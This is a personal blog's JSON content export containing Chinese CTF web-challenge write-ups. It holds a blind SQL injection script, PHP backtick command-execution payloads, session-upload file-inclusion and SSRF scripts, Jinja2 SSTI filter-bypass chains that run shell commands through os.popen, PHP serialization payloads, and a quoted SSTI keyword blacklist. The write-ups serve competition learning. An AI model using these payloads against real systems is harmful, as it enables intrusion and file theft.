{"meta":{"title":"Ma4out7'Blog","subtitle":"","description":"","author":"Ma4out7","url":"http://example.com","root":"/"},"pages":[{"title":"[404]（引号内为页面标题可更改）","date":"2021-03-18T09:59:50.505Z","updated":"2021-03-18T09:59:31.640Z","comments":true,"path":"404.html","permalink":"http://example.com/404.html","excerpt":"","text":""},{"title":"about","date":"2020-11-11T11:15:06.000Z","updated":"2021-04-09T01:20:20.679Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"kkkkkkkkkkkkkkkkkkkkk"},{"title":"categories","date":"2020-11-11T11:27:10.000Z","updated":"2020-11-11T11:27:40.034Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"links","date":"2020-11-11T11:56:04.000Z","updated":"2020-11-11T11:56:04.267Z","comments":true,"path":"links/index.html","permalink":"http://example.com/links/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-11-11T11:55:44.000Z","updated":"2020-11-11T11:55:44.471Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"红明谷-web 复现","slug":"CTF比赛/红明谷杯","date":"2021-04-06T14:06:06.000Z","updated":"2021-05-20T00:50:39.725Z","comments":true,"path":"2021/04/06/CTF比赛/红明谷杯/","link":"","permalink":"http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF/","excerpt":"","text":"参考红明谷杯官方 wp &gt; https://blog.csdn.net/mochu7777777/article/details/115410705? 红明谷杯-web 复现1.happysql 考点：使用了双引号闭合，没有回显的布尔盲注 很明显是布尔盲注了接下来考虑两个点： 1.截断函数用哪个？这里 mid()和 substring()已经被过滤了 2.如何绕过 information 截断函数可以用 left()和 right()，不过需要注意的是这两个函数并不能像 mid 和 substring 一样逐个截断，写脚本的时候注意下测试字符串的拼接。而绕过 information 已经是老生常谈了，猜测通过查询 mysql.innodb_table_stats 得到库名和表名mysql.innodb_table_stats 使用 下面是注入的脚本 12345678910111213141516171819202122232425262728293031323334import requestsimport binasciiburp0_url = &quot;http://eci-2ze6hpkvyv42lzgmdxw9.cloudeci1.ichunqiu.com/login.php&quot;burp0_cookies = &#123;&quot;__jsluid_h&quot;: &quot;a1606fe5f9707bca94488c2d982b99f4&quot;, &quot;PHPSESSID&quot;: &quot;fb934e887a0284aeb6b4aae1cb206963&quot;&#125;burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) G1ecko/20100101 Firefox/88.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Origin&quot;: &quot;http://eci-2ze0zymtn8akiu41ofjl.cloudeci1.ichunqiu.com&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: &quot;http://eci-2ze0zymtn8akiu41ofjl.cloudeci1.ichunqiu.com/index.php&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;&#125;# string = &quot;1234567890abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;string = &quot;1234567890abcdef-&#123;&#125;&quot;flag = &#x27;flag&#123;9eb68b21-9235-430c-8f24-a14ce8ec&#x27;# get table# for i in range(32):# for j string:# s = flag+j# payload = &quot;\\&quot;||(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats)/**/regexp/**/0x66&#123;&#125;#&quot;.format(s.encode(&#x27;hex&#x27;))# print(payload)# burp0_data = &#123;&quot;username&quot;: payload, &quot;password&quot;: &#x27;&#x27;&#125;# res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)# if &quot;home&quot; in res.text:# flag += j# print(flag)# breakfor i in range(32): for j in string: s = flag+j payload = &quot;\\&quot;||(select/**/*/**/from/**/f1ag)/**/regexp/**/0x&#123;&#125;#&quot;.format(s.encode(&#x27;hex&#x27;)) print(payload) burp0_data = &#123;&quot;username&quot;: payload, &quot;password&quot;: &#x27;&#x27;&#125; res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data) # print(res.text) if &quot;home&quot; in res.text: print(res.text) flag += j print(flag) break# print(res.text) 2.write_shell 考点: 代码审计，绕过 waf 写 shell 源码如下 过滤了 PHP，可以用短标签来绕过;/?action=upload&amp;data=&lt;?=(p.hpinfo)()?&gt;这里的.可以用来连接 phpinfo 反引号没过滤，可以直接写入并执行命令，试了一下在 PHP 中反引号里面的内容可以当做 shell 命令运行 1&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls%09-la%09&#x2F;&#96;?&gt; 直接读取，注意这里有个 php 后缀会被过滤，不过在命令执行种用*替换即可 1&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat%09&#x2F;!whatyouwantggggggg401*&#96;?&gt; 3.easytp 考察：Thinkphp POP 链 * 4.javaweb 后面两题等一下复现环境吧。。。","categories":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"http://example.com/categories/CTF%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"http://example.com/tags/CTF%E6%AF%94%E8%B5%9B/"}]},{"title":"CSICN-web","slug":"CTF比赛/ciscn","date":"2021-04-06T14:06:06.000Z","updated":"2021-06-06T09:38:12.111Z","comments":true,"path":"2021/04/06/CTF比赛/ciscn/","link":"","permalink":"http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/ciscn/","excerpt":"","text":"web sql 知识点 报错注入 join 无列名注入 &#39;)&#39;闭合，报错可用，得到 security 数据库， 报错要得到表名，information 被过滤，以下可用来爆表 1234sys.schema_table_statistics_with_buffersys.x$schema_table_statistics_with_buffersys.schema_auto_increment_columnssys.x$ps_schema_table_statistics_io 也可 123mysql.innodb_table_stats (此表中库名字段是 database_name，而非 table_schema)mysql.innodb_index_stats join 无列名注入 123456mysql&gt; select _ from (select _ from users a join users b)c;ERROR 1060 (42S21): Duplicate column name &#39;id&#39;mysql&gt; select _ from (select _ from users a join users b using(id))c;ERROR 1060 (42S21): Duplicate column name &#39;username&#39;mysql&gt; select _ from (select _ from users a join users b using(id,username))c;ERROR 1060 (42S21): Duplicate column name &#39;password&#39; Easy_resource 知识点 vim 备份文件 PHP 原生类使用，反射类ReflectionMethod 没找到源码，到后来才知道.index.php.swo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113&lt;?phpclass User&#123; private static $c &#x3D; 0; function a() &#123; return ++self::$c; &#125; function b() &#123; return ++self::$c; &#125; function c() &#123; return ++self::$c; &#125; function d() &#123; return ++self::$c; &#125; function e() &#123; return ++self::$c; &#125; function f() &#123; return ++self::$c; &#125; function g() &#123; return ++self::$c; &#125; function h() &#123; return ++self::$c; &#125; function i() &#123; return ++self::$c; &#125; function j() &#123; return ++self::$c; &#125; function k() &#123; return ++self::$c; &#125; function l() &#123; return ++self::$c; &#125; function m() &#123; return ++self::$c; &#125; function n() &#123; return ++self::$c; &#125; function o() &#123; return ++self::$c; &#125; function p() &#123; return ++self::$c; &#125; function q() &#123; return ++self::$c; &#125; function r() &#123; return ++self::$c; &#125; function s() &#123; return ++self::$c; &#125; function t() &#123; return ++self::$c; &#125;&#125;$rc&#x3D;$_GET[&quot;rc&quot;];$rb&#x3D;$_GET[&quot;rb&quot;];$ra&#x3D;$_GET[&quot;ra&quot;];$rd&#x3D;$_GET[&quot;rd&quot;];$method&#x3D; new $rc($ra, $rb);var_dump($method-&gt;$rd()); 考虑利用原生类 ReflectionMethod 读取 User 类中的方法；构建 payload：?rc=ReflectionMethod&amp;ra=User&amp;rb=&amp;rd=getDocComment，rb 取 a-z,burpb 爆破 middle_source 知识点 session_upload.progress 文件包含，参考 拿到题目没啥思路，扫一下，扫到.listing，存在 phpinfo 文件 符合 session_upload.progress 文件包含条件，参考：https://xz.aliyun.com/t/9545#toc-8，得知session 存放的位置 var/lib/php/sessions/bcjjeaegfcexp: 123456789101112131415161718import ioimport requestsimport threadingsessid &#x3D; &#39;whoami&#39;def POST(session):f &#x3D; io.BytesIO(b&#39;a&#39; _ 1024 _ 50)session.post(&#39;http:&#x2F;&#x2F;124.70.34.66:23747&#x2F;index.php&#39;,data&#x3D;&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?&#x3D;var_dump(scandir(&#39;&#x2F;etc&#x2F;adcfabcfeb&#x2F;hghdjaadja&#x2F;chagfbfiif&#x2F;aeaebebaje&#x2F;cabidgfcch&#x2F;fl444444g&#39;))?&gt;&quot;&#125;,files&#x3D;&#123;&quot;file&quot;:(&#39;q.txt&#39;, f)&#125;,cookies&#x3D;&#123;&#39;PHPSESSID&#39;:sessid&#125;)with requests.session() as session:while True:POST(session)print(&quot;[+] 成功写入 sess_whoami&quot;) 使用标签绕过上传以及 var_dump+scandir 函数打印出目录下文件 浏览器不断发包直到显示出目录下文件 找到一串随机生成的目录，一步步添加目录找下一级直到找到最终目录 /etc/adcfabcfeb/hghdjaadja/chagfbfiif/aeaebebaje/cabidgfcch/fl444444g换成原来的普通文件包含得到 flag","categories":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"http://example.com/categories/CTF%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"http://example.com/tags/CTF%E6%AF%94%E8%B5%9B/"}]},{"title":"DASctf-web 复现","slug":"CTF比赛/DASctf/DASctf","date":"2021-04-06T14:06:06.000Z","updated":"2021-05-19T12:50:45.145Z","comments":true,"path":"2021/04/06/CTF比赛/DASctf/DASctf/","link":"","permalink":"http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/DASctf/","excerpt":"","text":"DASctf-web 复现 太菜了呀，又是凑数的一天参考https://shimo.im/docs/lf9OcEmdH70MC17f/read 1.BestDB8考点：联合查询+load_file 文件读取 上来就给了 SQL 语句 PHPF12 源码注释中显示$sql = &quot;SELECT * FROM users WHERE id = &#39;$query&#39; OR username = \\\\&quot;$query\\\\&quot;&quot;; query=1和query=2均有回显，但是对于单引号进行了过滤，但是它给了 username，通过 username 发现双引号是没有被过滤的，接着测试发现还过滤空格，payload 123456789查表lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(table_name),2,3&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()# 查列lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(column_name),2,3&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&quot;f1agdas&quot;&#x2F;**&#x2F;and&#x2F;**&#x2F;table_schema&#x3D;database()# 查数据lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(f1agdas),2,3&#x2F;**&#x2F;from&#x2F;**&#x2F;f1agdas#回显了一个flag.txt，应该是要去读数据了这里使用load_file()函数lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;load_file(0x2f666c6167)),2,3# 这里读的文件是/flag，我也不知道为啥数据库要写 flag.txt，这里对”/“也进行了过滤，可以用十六进制或者 CHAR()绕过 可惜了，做题时没想到通过 username 的双引号闭合来注入,username 变量 复现中出现的问题以上 payload 如果直接在 hackerbar 或者 bp 中使用，不会返回结果，需要 URL 编码后的 payload 才可以的得到正确回显不知道是不是环境的原因，查看 flag,找不到 flag… 昨天没有做出来，现在又可以了query=-1%22union/**/select/**/1,load_file(0x2f666c61672e747874),3%23 2.baby_flask 黑名单过滤 123456789Hi young boy!&lt;/br&gt;Do you like ssti?&lt;/br&gt;blacklist&lt;/br&gt;&#x27;.&#x27;,&#x27;[&#x27;,&#x27;\\&#x27;&#x27;,&#x27;&quot;&#x27;,&#x27;&#x27;\\\\&#x27;,&#x27;+&#x27;,&#x27;:&#x27;,&#x27;_&#x27;,&lt;/br&gt;&#x27;chr&#x27;,&#x27;pop&#x27;,&#x27;class&#x27;,&#x27;base&#x27;,&#x27;mro&#x27;,&#x27;init&#x27;,&#x27;globals&#x27;,&#x27;get&#x27;,&lt;/br&gt;&#x27;eval&#x27;,&#x27;exec&#x27;,&#x27;os&#x27;,&#x27;popen&#x27;,&#x27;open&#x27;,&#x27;read&#x27;,&lt;/br&gt;&#x27;select&#x27;,&#x27;url_for&#x27;,&#x27;get_flashed_messages&#x27;,&#x27;config&#x27;,&#x27;request&#x27;,&lt;/br&gt;&#x27;count&#x27;,&#x27;length&#x27;,&#x27;０&#x27;,&#x27;１&#x27;,&#x27;２&#x27;,&#x27;３&#x27;,&#x27;４&#x27;,&#x27;５&#x27;,&#x27;６&#x27;,&#x27;７&#x27;,&#x27;８&#x27;,&#x27;９&#x27;,&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;&lt;/br&gt;&lt;/br&gt; 考点: 在于对数字过滤后，对于一些关键词的拼凑，不过这里我是以 unicode 编码绕过了，知识点：python3 支持 unicode 编码，所以可以使用”𝟘-𝟡”替换数字，测试的使用&#123;%print 𝟡%&#125;如果可以正常回显就代表支持， 过滤了点和中括号这样的，但是没过滤掉|attr，因此拿 attr 来绕即可。类似于 globals 的，利用 flask 中的 join 过滤器同样可以拼接出：&#123;% set gl=dict(glo=a,bals=a)|join%&#125; 这里放各位师傅的 payload 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162不知名师傅&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125; # pop&#123;%set b&#x3D;lipsum|string|list|attr(a)(𝟙𝟠)%&#125; # _&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125; # globals&#123;%set d&#x3D;(b,b,dict(ge&#x3D;cc,tit&#x3D;dd,em&#x3D;aa)|join,b,b)|join%&#125; # getitem&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125; # os&#123;%set f&#x3D;lipsum|string|list|attr(a)(𝟡)%&#125; # 空格&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%&#125; # 斜杠&#123;%set i&#x3D;(dict(cat&#x3D;aa)|join,f,g,dict(flag&#x3D;aa)|join)|join%&#125; # cat &#x2F;flag&#123;%set h&#x3D;(a,dict(en&#x3D;aa)|join|join)|join%&#125; # popen&#123;%set i&#x3D;dict(re&#x3D;aa,ad&#x3D;aa)|join%&#125; # read&#123;%set z&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%&#125; #点&#123;%set j&#x3D;(dict(ls&#x3D;aa)|join,f,g,(dict(var&#x3D;aa)|join),g,(dict(www&#x3D;aa)|join),g,(dict(flask&#x3D;aa)|join)|join)|join%&#125; #ls &#x2F;var&#x2F;www&#x2F;flask&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;#最后拼接起来#&#123;&#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;ls &#x2F;var&#x2F;www&#x2F;flask&#39;).read()&#125;&#125;最后的payload如下，成功执行ls &#x2F;var&#x2F;www&#x2F;flask就可以看到flag了name&#x3D;&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125;&#123;%set b&#x3D;lipsum|string|list|attr(a)(𝟙𝟠)%&#125;&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125;&#123;%set d&#x3D;(b,b,dict(ge&#x3D;cc,tit&#x3D;dd,em&#x3D;aa)|join,b,b)|join%&#125;&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125;&#123;%set f&#x3D;lipsum|string|list|attr(a)(𝟡)%&#125;&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%&#125;&#123;%set i&#x3D;(dict(cat&#x3D;aa)|join,f,g,dict(flag&#x3D;aa)|join)|join%&#125;&#123;%set h&#x3D;(a,dict(en&#x3D;aa)|join|join)|join%&#125;&#123;%set i&#x3D;dict(re&#x3D;aa,ad&#x3D;aa)|join%&#125;&#123;%set z&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%&#125;&#123;%set j&#x3D;(dict(ls&#x3D;aa)|join,f,g,(dict(var&#x3D;aa)|join),g,(dict(www&#x3D;aa)|join),g,(dict(flask&#x3D;aa)|join)|join)|join%&#125;&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;雪殇师傅&#123;% set dot &#x3D; g|lower|list|sort|join|trim|replace(sq,emp)|list|first %&#125;&#123;%set gar &#x3D; ()|select|string|lower|unique|list|list|join %&#125;&#123;%set lt &#x3D; gar|first %&#125;&#123;%set gw &#x3D; gar|replace(lt, emp)|first %&#125;&#123;%set e &#x3D; gar|replace(lt, emp)|replace(gw, emp)|first %&#125;&#123;%set n &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|first %&#125;&#123;%set r &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|first %&#125;&#123;%set a &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|first %&#125;&#123;%set t &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|first %&#125;&#123;%set o &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|first %&#125;&#123;%set nbsp &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|first %&#125;&#123;%set b &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|first %&#125;&#123;%set j &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|replace(b, emp)|first %&#125;&#123;%set c &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|replace(b, emp)|replace(j, emp)|first %&#125;&#123;%set s &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|replace(b, emp)|replace(j, emp)|replace(c,emp)|first %&#125;&#123;%set l &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|replace(b, emp)|replace(j, emp)|replace(c,emp)|replace(s,emp)|first %&#125;&#123;%set un &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|replace(b, emp)|replace(j, emp)|replace(c,emp)|replace(s,emp)|replace(l,emp)|first %&#125;&#123;%set kw&#x3D;dict(warnings&#x3D;a)|join %&#125;&#123;%set cls&#x3D;un~un~c~l~a~s~s~un~un%&#125;&#123;%set bsx&#x3D;dict(ba&#x3D;a,se&#x3D;a)|join%&#125;&#123;%set bs&#x3D;un~un~bsx~un~un %&#125;&#123;%set ints&#x3D;dict(in&#x3D;a,t&#x3D;a)|join %&#125;&#123;%set scx&#x3D;dict(sub&#x3D;a,cla&#x3D;a,sses&#x3D;a)|join%&#125;&#123;%set sc&#x3D;un~un~scx~un~un%&#125;&#123;%set name&#x3D; un~un~dict(na&#x3D;na,me&#x3D;me)|join~un~un%&#125;&#123;%set gti &#x3D; un~un~dict(ge&#x3D;a,tite&#x3D;a,m&#x3D;a)|join~un~un%&#125;&#123;%for x in ()|attr(cls)|attr(bs)|attr(sc)()%&#125;&#123;%if kw in x|attr(name) %&#125;&#123;%set sla &#x3D; x()|attr(un~dict(module&#x3D;a)|join)|attr(un~un~dict(built&#x3D;a,ins&#x3D;b)|join~un~un)|attr(gti)((un~un~dict(imp&#x3D;a,ort&#x3D;a)|join~un~un))(dict(o&#x3D;a,s&#x3D;a)|join)|attr(dict(po&#x3D;a,pen&#x3D;a)|join)(dict(pw&#x3D;a,d&#x3D;a)|join)|attr(dict(re&#x3D;a,ad&#x3D;a)|join)()|string|list|first%&#125;&#123;%print(x()|attr(un~dict(module&#x3D;a)|join)|attr(un~un~dict(built&#x3D;a,ins&#x3D;b)|join~un~un)|attr(gti)((un~un~dict(imp&#x3D;a,ort&#x3D;a)|join~un~un))(dict(o&#x3D;a,s&#x3D;a)|join)|attr(dict(po&#x3D;a,pen&#x3D;a)|join)(dict(ls&#x3D;a)|join)~sla~dict(start&#x3D;a)|join~dot~dict(sh&#x3D;a)|join|attr(dict(re&#x3D;a,ad&#x3D;a)|join)())%&#125;&#123;%endif%&#125;&#123;%endfor%&#125; feng师傅&#123;% set id&#x3D;dict(ind&#x3D;a,ex&#x3D;a)|join%&#125;&#123;% set pp&#x3D;dict(po&#x3D;a,p&#x3D;a)|join%&#125;&#123;% set ls&#x3D;dict(ls&#x3D;a)|join%&#125;&#123;% set ppe&#x3D;dict(po&#x3D;a,pen&#x3D;a)|join%&#125;&#123;% set gt&#x3D;dict(ge&#x3D;a,t&#x3D;a)|join%&#125;&#123;% set cr&#x3D;dict(ch&#x3D;a,r&#x3D;a)|join%&#125;&#123;% set nn&#x3D;dict(n&#x3D;a)|join%&#125;&#123;% set tt&#x3D;dict(t&#x3D;a)|join%&#125;&#123;% set ff&#x3D;dict(f&#x3D;a)|join%&#125;&#123;% set ooqq&#x3D;dict(o&#x3D;a,s&#x3D;a)|join %&#125;&#123;% set rd&#x3D;dict(re&#x3D;a,ad&#x3D;a)|join%&#125;&#123;% set five&#x3D;(lipsum|string|list)|attr(id)(tt) %&#125;&#123;% set three&#x3D;(lipsum|string|list)|attr(id)(nn) %&#125;&#123;% set one&#x3D;(lipsum|string|list)|attr(id)(ff) %&#125;&#123;% set shiba&#x3D;five*five-three-three-one %&#125;&#123;% set xiahuaxian&#x3D;(lipsum|string|list)|attr(pp)(shiba) %&#125;&#123;% set gb&#x3D;(xiahuaxian,xiahuaxian,dict(glob&#x3D;a,als&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;&#123;% set bin&#x3D;(xiahuaxian,xiahuaxian,dict(builtins&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;&#123;% set chcr&#x3D;(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;&#123;% set xiegang&#x3D;chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;&#123;% set space&#x3D;chcr(three*three*five-five-five-three) %&#125;&#123;% set shell&#x3D;(ls,space,xiegang,dict(var&#x3D;a)|join,xiegang,dict(www&#x3D;a)|join,xiegang,dict(flask&#x3D;a)|join)|join %&#125;&#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125;感觉feng师傅这个比较像预期解 这篇羽师傅-SSTI 模板注入绕过（进阶篇）总结的很全面 参考https://blog.csdn.net/rfrder/article/details/115272645 &gt; https://shimo.im/docs/lf9OcEmdH70MC17f/read 3.ez_serialize SPL 是什么？顾名思义，SPL 就是 Standard PHP Library 的缩写。据手册显示，SPL 是用于解决典型问题(standard problems)的一组接口与类的集合。打开手册，正如上面的定义一样，有许多封装好的类。因为是要解决典型问题，免不了有一些处理文件的类。 SLP 类中存在能够进行文件处理和迭代的类： 类 描述DirectoryIterator| 遍历目录FilesystemIterator | 遍历目录GlobIterator 遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*SplFileObject 读取文件，按行读取，多行需要遍历finfo/finfo_open() 需要两个参数源码： 判断了给出的 A、B、C 三个类都没有什么危险函数，应该是没有利用的点，想到应该是原生类的利用。 源码 直接读取/var/www/html 下文件有哪些,得到一个 flag 所在的文件夹，再遍历这个文件夹发现存在 flag.php 12345678&lt;?phpclass A&#123; public $class=&#x27;FilesystemIterator&#x27;; public $para=&quot;/var/www/html&quot;; public $check; &#125;$o = new A();echo serialize($o); 得到序列化字符串O:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;para&quot;;s:13:&quot;/var/www/html&quot;;s:5:&quot;check&quot;;N;&#125;回显 html 下的文件夹 1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE 读取 flag 123456789&lt;?phpclass A&#123; public $class=&#x27;SplFileObject&#x27;; public $para=&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;; public $check; &#125;$o = new A();echo serialize($o); 序列化字符串O:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:13:&quot;SplFileObject&quot;;s:4:&quot;para&quot;;s:55:&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;;s:5:&quot;check&quot;;N;&#125; 参考http://www.plasf.cn/articles/dasctf202103.html 4.ez_login https://www.freebuf.com/news/202819.html 考点:SSRF 和 session 绕过第一点绕过 SESSION 只需要 PHP_SESSION_UPLOAD_PROGRESS 就完事了。注入 Boo 了盲注， SSRF 和 session 绕过 给了源码 12345678910111213141516171819202122232425Index.php&lt;?php if(!isset($_SESSION))&#123; highlight_file(__FILE__); die(&quot;no session&quot;); &#125; include(&quot;./php/check_ip.php&quot;); error_reporting(0); $url = $_GET[&#x27;url&#x27;]; if(check_inner_ip($url))&#123; if($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1); $output = curl_exec($ch); $result_info = curl_getinfo($ch); curl_close($ch); &#125; &#125;else&#123; echo &quot;Your IP is internal yoyoyo&quot;; &#125;?&gt; se1f_log3n.php 1234567891011121314151617&lt;?phpinclude(&quot;./php/db.php&quot;);include(&quot;./php/check_ip.php&quot;);error_reporting(E_ALL);$ip = $_SERVER[&quot;REMOTE_ADDR&quot;];if($ip !== &quot;127.0.0.1&quot;)&#123; exit();&#125;else&#123; try&#123; $sql = &#x27;SELECT `username`,`password` FROM `user` WHERE `username`= &quot;&#x27;.$username.&#x27;&quot; and `password`=&quot;&#x27;.$password.&#x27;&quot;;&#x27;; $result = $con-&gt;query($sql); echo $sql; &#125;catch(Exception $e)&#123; echo $e-&gt;getMessage(); &#125; ($result-&gt;num_rows &gt; 0 AND $row = $result-&gt;fetch_assoc() AND $con-&gt;close() AND die(&quot;error&quot;)) OR ( ($con-&gt;close() AND die(&#x27;Try again!&#x27;) ));&#125; 大佬脚本 1234567891011121314151617# coding=utf-8import ioimport requestsimport threadingtables = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-&#125;&#123;&#x27;flag = &#x27;&#x27;sessid = &#x27;flag&#x27;for i in range(1,70): for j in tables: url = &quot;http://6ac49c07-405e-454b-8b76-50c4b3adb45d.machine.dasctf.com/?url=http://localhost/se1f_Log3n.php?username=admin&#x27; password regexp binary %s-- #&amp;password=admin&quot;%(j) f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50) session = requests.session() resp = session.post(url,data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;x&#x27;&#125;,files=&#123;&#x27;file&#x27;: (&#x27;tgao.txt&#x27;, f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125;) if &#x27;wrong&#x27; not in resp.text: flag = flag +j print(j) 复现问题： 